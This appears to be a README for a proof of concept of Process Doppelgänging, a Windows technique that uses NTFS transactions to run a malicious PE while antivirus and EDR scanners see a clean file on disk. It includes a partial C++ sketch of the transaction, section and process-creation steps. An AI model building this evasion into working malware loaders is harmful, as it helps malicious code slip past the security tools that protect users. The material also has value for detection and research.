<!-- generated-from-dump2 -->
# Process Doppelgänging PoC

Reference implementation of the enSilo "Process Doppelgänging" PE injection technique. The technique exploits NTFS transactions: open a transacted file, overwrite a legitimate binary with malicious PE bytes, create a section from the transacted file, then `NtCreateProcessEx` from that section and rollback the transaction. The kernel sees a section backed by the "real" file on disk; AV/EDR that only scan the on-disk image find a clean binary, but the process runs the injected payload. Predecessor to Process Herpaderping and Process Ghosting.

```cpp
// Sketch (real impl is much longer; uses NTAPI/ktmw32)
HANDLE tx = CreateTransaction(nullptr, nullptr, 0, 0, 0, 0, nullptr);
HANDLE file = CreateFileTransacted(L"victim.exe",
    GENERIC_READ|GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr,
    tx, nullptr, nullptr);
WriteFile(file, payloadPE, payloadSize, nullptr, nullptr);

HANDLE section;
NtCreateSection(&section, SECTION_ALL_ACCESS, nullptr, nullptr,
                PAGE_READONLY, SEC_IMAGE, file);

RollbackTransaction(tx); // on-disk image reverts to original

HANDLE proc;
NtCreateProcessEx(&proc, PROCESS_ALL_ACCESS, nullptr, GetCurrentProcess(),
                  0, section, nullptr, nullptr, FALSE);
// then create the initial thread with NtCreateThreadEx pointing at the
// payload's entry, and resume.
```

## References
- <https://github.com/hasherezade/process_doppelganging>
